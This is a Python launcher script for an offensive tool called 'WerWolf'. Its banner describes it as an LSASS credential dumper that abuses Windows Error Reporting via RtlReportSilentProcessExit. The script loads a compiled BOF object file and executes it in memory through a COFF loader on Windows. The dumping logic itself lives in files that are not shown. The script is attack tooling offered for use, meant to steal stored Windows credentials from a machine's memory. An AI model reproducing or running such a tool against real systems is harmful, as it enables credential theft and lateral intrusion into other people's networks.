import sys
import os
import logging
import platform


BANNER = r"""
                          ..
                         / _}
                  _     /  /
                / `\  /  /
                \   \/  /     WerWolf
                 \     /      --------
             ,    )   (       LSASS Credential Dumper
            / \_ / \   \      via RtlReportSilentProcessExit
           /       /    \
          /   __  /   _  \    Abusing Windows Error Reporting
         /   /  \/   / \  |   In-Memory COFF/BOF Loader
        |   /   /   /   | |
         \_/   /   /  _/ /
               \__/\_/ \_/
"""

BOF_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bofs", "wer_execute.o")


def main():
    verbose = "-v" in sys.argv or "--verbose" in sys.argv

    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(level=level, format="[%(levelname)s] %(message)s")

    print(BANNER)

    # Read BOF
    if not os.path.isfile(BOF_PATH):
        print(f"[!] BOF not found: {BOF_PATH}")
        sys.exit(1)

    with open(BOF_PATH, "rb") as f:
        coff_data = f.read()

    print(f"[*] BOF file   : {BOF_PATH}")
    print(f"[*] File size  : {len(coff_data):,} bytes")
    print(f"[*] Entry point: go")

    # Execution requires Windows
    if platform.system() != "Windows":
        print("\n[!] Execution requires Windows (VirtualAlloc, LoadLibrary, etc.)")
        sys.exit(1)

    # Load and execute
    from loader.loader import CoffLoader

    print(f"[*] Platform   : {platform.system()} {platform.machine()}")
    print()

    loader = CoffLoader()
    loader.load_and_execute(coff_data, entry_name="go")

    print()
    print("=" * 60)
    print("  Execution complete.")
    print("=" * 60)


if __name__ == "__main__":
    main()
